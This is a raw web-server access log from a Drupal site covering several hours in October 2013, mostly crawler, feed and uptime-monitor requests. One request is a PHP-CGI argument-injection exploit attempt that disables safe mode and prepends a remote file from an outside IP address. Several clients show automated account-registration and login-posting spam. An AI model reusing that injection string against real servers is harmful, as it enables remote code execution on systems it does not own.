5.63.145.68 - - [14/Oct/2013:03:05:13 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:03:08:54 +0200] "GET /taxonomy/term/1?lang=fr HTTP/1.1" 200 5142 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:03:09:27 +0200] "GET /node/79 HTTP/1.1" 200 6637 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
80.72.35.91 - - [14/Oct/2013:03:10:19 +0200] "GET /?q=user/register HTTP/1.1" 200 5330 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
80.72.35.91 - - [14/Oct/2013:03:10:20 +0200] "GET /?q=node/add HTTP/1.1" 403 4821 "http://hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
94.23.165.113 - - [14/Oct/2013:03:18:12 +0200] "GET /node/3 HTTP/1.1" 200 6678 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.39.20.183 - - [14/Oct/2013:03:18:14 +0200] "GET /?q=node/add HTTP/1.0" 403 4780 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.39.20.183 - - [14/Oct/2013:03:18:15 +0200] "GET /?q=user/register HTTP/1.0" 200 5329 "http://www.hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.39.20.183 - - [14/Oct/2013:03:18:15 +0200] "POST /?q=user/register HTTP/1.0" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.39.20.183 - - [14/Oct/2013:03:18:15 +0200] "GET / HTTP/1.0" 200 6715 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
5.63.145.68 - - [14/Oct/2013:03:22:47 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:03:27:51 +0200] "GET /node/100?lang=fr HTTP/1.1" 200 6818 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:03:32:28 +0200] "GET /node/148 HTTP/1.1" 200 6363 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:03:37:53 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:03:39:22 +0200] "GET /node/117?lang=fr HTTP/1.1" 200 6890 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
180.76.5.18 - - [14/Oct/2013:03:44:13 +0200] "GET /node/66?lang=en HTTP/1.1" 200 7130 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
208.115.111.71 - - [14/Oct/2013:03:45:29 +0200] "GET /node/51?lang=en HTTP/1.1" 200 23615 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
208.115.111.71 - - [14/Oct/2013:03:45:44 +0200] "GET /node/64?lang=en HTTP/1.1" 200 28735 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
123.125.71.15 - - [14/Oct/2013:03:46:48 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.92 - - [14/Oct/2013:03:48:48 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.153.236.154 - - [14/Oct/2013:03:50:41 +0200] "GET / HTTP/1.1" 200 6353 "http://hurence.com/" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11)  Firefox/1.5.0.11; 360Spider"
5.63.145.68 - - [14/Oct/2013:03:55:32 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.63.145.68 - - [14/Oct/2013:03:55:34 +0200] "GET / HTTP/1.1" 200 27767 "-" "checks.panopta.com"
110.136.107.246 - - [14/Oct/2013:04:01:23 +0200] "GET /index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt HTTP/1.1" 200 29027 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0"
209.85.238.70 - - [14/Oct/2013:04:02:15 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
5.63.145.68 - - [14/Oct/2013:04:10:36 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:04:14:15 +0200] "GET /node/22?lang=en HTTP/1.1" 200 6259 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:04:21:09 +0200] "GET /node/139 HTTP/1.1" 200 6857 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:04:26:51 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:04:32:51 +0200] "GET /node/81?lang=en HTTP/1.1" 200 6463 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
208.115.113.87 - - [14/Oct/2013:04:39:48 +0200] "GET /robots.txt HTTP/1.1" 200 1793 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
208.115.113.87 - - [14/Oct/2013:04:39:48 +0200] "GET /robots.txt HTTP/1.1" 200 1793 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
157.55.33.26 - - [14/Oct/2013:04:40:29 +0200] "GET /robots.txt HTTP/1.1" 200 1850 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.63.145.68 - - [14/Oct/2013:04:42:10 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
220.181.108.116 - - [14/Oct/2013:04:42:35 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.54 - - [14/Oct/2013:04:43:01 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.10.83.11 - - [14/Oct/2013:04:44:56 +0200] "GET /node/99?lang=fr HTTP/1.1" 200 7071 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
119.63.193.195 - - [14/Oct/2013:04:46:15 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
157.55.33.26 - - [14/Oct/2013:04:47:02 +0200] "GET /node/68 HTTP/1.1" 200 6725 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.10.83.11 - - [14/Oct/2013:04:52:38 +0200] "GET /node/129 HTTP/1.1" 200 5399 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
209.85.238.70 - - [14/Oct/2013:04:53:05 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
192.119.148.167 - - [14/Oct/2013:04:54:43 +0200] "GET / HTTP/1.0" 200 6356 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
192.119.148.167 - - [14/Oct/2013:04:54:46 +0200] "GET /?q=user HTTP/1.0" 200 5097 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
192.119.148.167 - - [14/Oct/2013:04:54:48 +0200] "POST /?q=user HTTP/1.0" 200 5176 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
157.55.33.26 - - [14/Oct/2013:04:58:23 +0200] "GET /node/124?lang=fr HTTP/1.1" 200 6812 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.63.145.68 - - [14/Oct/2013:04:58:43 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
178.32.232.14 - - [14/Oct/2013:05:00:48 +0200] "GET / HTTP/1.1" 200 6359 "http://www.hurence.com" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
74.121.150.244 - - [14/Oct/2013:05:00:50 +0200] "GET /?q=node/add HTTP/1.0" 403 4787 "http://www.hurence.com" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
74.121.150.244 - - [14/Oct/2013:05:00:51 +0200] "GET /?q=user/register HTTP/1.0" 200 5331 "http://www.hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
74.121.150.244 - - [14/Oct/2013:05:00:52 +0200] "POST /?q=user/register HTTP/1.0" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
74.121.150.244 - - [14/Oct/2013:05:00:53 +0200] "GET / HTTP/1.0" 200 6719 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
74.121.150.244 - - [14/Oct/2013:05:00:57 +0200] "GET /?q=user HTTP/1.0" 200 5097 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
74.121.150.244 - - [14/Oct/2013:05:00:59 +0200] "POST /?q=user HTTP/1.0" 200 5175 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0"
93.182.159.11 - - [14/Oct/2013:05:02:31 +0200] "GET / HTTP/1.1" 200 6361 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
93.182.159.11 - - [14/Oct/2013:05:02:33 +0200] "GET /?q=user HTTP/1.1" 200 5093 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
93.182.159.11 - - [14/Oct/2013:05:02:33 +0200] "POST /?q=user HTTP/1.1" 200 5180 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.10.83.11 - - [14/Oct/2013:05:06:10 +0200] "GET /node/114?lang=fr HTTP/1.1" 200 6881 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:05:13:50 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:05:14:34 +0200] "GET /?lang=fr HTTP/1.1" 200 6644 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:05:16:58 +0200] "GET /node/107 HTTP/1.1" 200 6443 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
217.69.133.249 - - [14/Oct/2013:05:21:23 +0200] "GET /robots.txt HTTP/1.0" 200 1812 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
217.69.133.253 - - [14/Oct/2013:05:21:33 +0200] "GET /robots.txt HTTP/1.0" 200 1812 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)"
5.63.145.68 - - [14/Oct/2013:05:29:07 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
66.249.66.213 - - [14/Oct/2013:05:31:04 +0200] "GET /node/26?lang=en HTTP/1.1" 200 6658 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:05:31:07 +0200] "GET /node/136 HTTP/1.1" 200 9445 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:05:35:05 +0200] "GET / HTTP/1.1" 200 6361 "-" "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:05:35:13 +0200] "GET / HTTP/1.1" 200 6362 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
208.115.113.87 - - [14/Oct/2013:05:35:48 +0200] "GET /node/45?lang=fr HTTP/1.1" 200 31482 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
208.115.113.87 - - [14/Oct/2013:05:36:04 +0200] "GET /node/32 HTTP/1.1" 200 23415 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
180.76.5.178 - - [14/Oct/2013:05:36:14 +0200] "GET /node/141?lang=fr HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.46 - - [14/Oct/2013:05:41:17 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.84 - - [14/Oct/2013:05:41:32 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.10.83.11 - - [14/Oct/2013:05:42:59 +0200] "GET /node/145?lang=fr HTTP/1.1" 200 6915 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:05:44:41 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
66.249.66.110 - - [14/Oct/2013:05:48:29 +0200] "GET /robots.txt HTTP/1.1" 200 985 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.10.83.11 - - [14/Oct/2013:05:53:00 +0200] "GET /node/104?lang=fr HTTP/1.1" 200 7013 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
209.85.238.70 - - [14/Oct/2013:05:54:36 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
5.10.83.11 - - [14/Oct/2013:05:58:59 +0200] "GET /node/40 HTTP/1.1" 200 6650 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:05:59:44 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:06:01:04 +0200] "GET /node/10 HTTP/1.1" 200 6505 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
157.55.33.26 - - [14/Oct/2013:06:12:51 +0200] "GET /robots.txt HTTP/1.1" 200 1850 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.33.26 - - [14/Oct/2013:06:13:27 +0200] "GET /node/135?lang=en HTTP/1.1" 200 5482 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.63.145.68 - - [14/Oct/2013:06:14:46 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
176.31.7.174 - - [14/Oct/2013:06:24:59 +0200] "GET /node/3 HTTP/1.1" 200 6679 "http://www.hurence.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.8"
176.31.7.174 - - [14/Oct/2013:06:25:01 +0200] "GET /?q=user/register HTTP/1.1" 200 5332 "http://www.hurence.com/node/3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.8"
176.31.7.174 - - [14/Oct/2013:06:25:01 +0200] "POST /?q=user/register HTTP/1.1" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.8"
176.31.7.174 - - [14/Oct/2013:06:25:02 +0200] "GET / HTTP/1.1" 200 6714 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.8"
176.31.7.174 - - [14/Oct/2013:06:25:04 +0200] "GET /node/76?q=user HTTP/1.1" 200 5099 "http://www.hurence.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.8"
176.31.7.174 - - [14/Oct/2013:06:25:04 +0200] "POST /node/76?q=user HTTP/1.1" 200 5182 "http://www.hurence.com/node/76?q=user" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.8 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.8"
208.43.225.84 - - [14/Oct/2013:06:29:05 +0200] "GET /robots.txt HTTP/1.1" 200 985 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:29:09 +0200] "GET /node/15 HTTP/1.1" 200 6240 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:29:14 +0200] "GET /node/148 HTTP/1.1" 200 6425 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:29:19 +0200] "GET /node/146 HTTP/1.1" 200 6815 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:29:24 +0200] "GET /node/144 HTTP/1.1" 200 6591 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:29:29 +0200] "GET /node/142 HTTP/1.1" 200 6303 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:29:34 +0200] "GET /node/140 HTTP/1.1" 200 6641 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
5.63.145.68 - - [14/Oct/2013:06:29:49 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
208.43.225.84 - - [14/Oct/2013:06:31:09 +0200] "GET /node/136 HTTP/1.1" 200 9444 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:33:41 +0200] "GET /node/134 HTTP/1.1" 200 5434 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
216.244.80.122 - - [14/Oct/2013:06:35:11 +0200] "GET /node/3 HTTP/1.0" 200 29218 "http://www.hurence.com/node/3" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
216.244.80.122 - - [14/Oct/2013:06:35:14 +0200] "GET /node/82 HTTP/1.0" 200 29219 "http://www.hurence.com/82" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
216.244.80.122 - - [14/Oct/2013:06:35:17 +0200] "GET /node/6 HTTP/1.0" 200 29295 "http://www.hurence.com/6" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
216.244.80.122 - - [14/Oct/2013:06:35:20 +0200] "GET /node/5 HTTP/1.0" 200 23448 "http://www.hurence.com/5" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
216.244.80.122 - - [14/Oct/2013:06:35:22 +0200] "GET /node/59 HTTP/1.0" 200 28514 "http://www.hurence.com/59" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
209.85.238.70 - - [14/Oct/2013:06:42:35 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
208.43.225.84 - - [14/Oct/2013:06:43:43 +0200] "GET /node/132 HTTP/1.1" 200 6002 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:43:48 +0200] "GET /node/128 HTTP/1.1" 200 6877 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:43:53 +0200] "GET /node/126 HTTP/1.1" 200 6566 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:43:58 +0200] "GET /node/12 HTTP/1.1" 200 6360 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:44:03 +0200] "GET /node/11 HTTP/1.1" 200 6840 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:44:11 +0200] "GET /node/107 HTTP/1.1" 200 6503 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:44:16 +0200] "GET /node/10 HTTP/1.1" 200 6560 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
208.43.225.84 - - [14/Oct/2013:06:44:21 +0200] "GET /?lang=fr HTTP/1.1" 200 6707 "-" "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)"
5.63.145.68 - - [14/Oct/2013:06:44:54 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
66.249.66.213 - - [14/Oct/2013:06:45:01 +0200] "GET /sites/all/modules/views/css/views.css?ls5cse HTTP/1.1" 200 649 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:06:45:02 +0200] "GET /sites/all/themes/hurence/css/layout-fixed.css?ls5cse HTTP/1.1" 200 1924 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:06:45:03 +0200] "GET /sites/all/themes/hurence/css/tabs.css?ls5cse HTTP/1.1" 200 1058 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:06:45:03 +0200] "GET /sites/all/themes/hurence/css/html-reset.css?ls5cse HTTP/1.1" 200 3350 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:06:45:04 +0200] "GET /sites/all/themes/hurence/css/blocks.css?ls5cse HTTP/1.1" 200 1869 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:06:45:04 +0200] "GET /sites/all/themes/hurence/css/fields.css?ls5cse HTTP/1.1" 200 700 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.213 - - [14/Oct/2013:06:45:05 +0200] "GET /sites/all/modules/ctools/css/ctools.css?ls5cse HTTP/1.1" 200 591 "http://www.hurence.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.9.113.10 - - [14/Oct/2013:06:49:42 +0200] "GET /robots.txt HTTP/1.1" 200 985 "-" "Apache-HttpClient/4.3 (java 1.5)"
5.9.113.10 - - [14/Oct/2013:06:49:42 +0200] "GET / HTTP/1.1" 200 6356 "-" "Apache-HttpClient/4.3 (java 1.5)"
5.10.83.11 - - [14/Oct/2013:06:57:07 +0200] "GET /node/107?lang=en HTTP/1.1" 200 6495 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:07:00:21 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
157.55.33.26 - - [14/Oct/2013:07:03:46 +0200] "GET /node/124?lang=fr HTTP/1.1" 200 6818 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.33.26 - - [14/Oct/2013:07:04:01 +0200] "GET /node/68 HTTP/1.1" 200 6725 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
119.63.193.196 - - [14/Oct/2013:07:07:33 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
5.10.83.11 - - [14/Oct/2013:07:08:11 +0200] "GET /node/70 HTTP/1.1" 200 6442 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
198.46.144.22 - - [14/Oct/2013:07:13:14 +0200] "GET /node/3 HTTP/1.0" 200 6673 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
198.46.144.22 - - [14/Oct/2013:07:13:17 +0200] "GET /?q=node/add HTTP/1.0" 403 4782 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
198.46.144.22 - - [14/Oct/2013:07:13:20 +0200] "GET /?q=user/register HTTP/1.0" 200 5329 "http://www.hurence.com/?q=node/add" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
198.46.144.22 - - [14/Oct/2013:07:13:22 +0200] "POST /?q=user/register HTTP/1.0" 302 678 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
198.46.144.22 - - [14/Oct/2013:07:13:24 +0200] "GET / HTTP/1.0" 200 6716 "http://www.hurence.com/?q=user/register" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
198.46.144.22 - - [14/Oct/2013:07:13:28 +0200] "GET /?q=user HTTP/1.0" 200 5098 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
198.46.144.22 - - [14/Oct/2013:07:13:30 +0200] "POST /?q=user HTTP/1.0" 200 5175 "http://www.hurence.com/?q=user" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
5.63.145.68 - - [14/Oct/2013:07:15:50 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:07:23:28 +0200] "GET /node/44?lang=fr HTTP/1.1" 200 6573 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.10.83.11 - - [14/Oct/2013:07:25:06 +0200] "GET /node/102?lang=fr HTTP/1.1" 200 6930 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:07:31:01 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
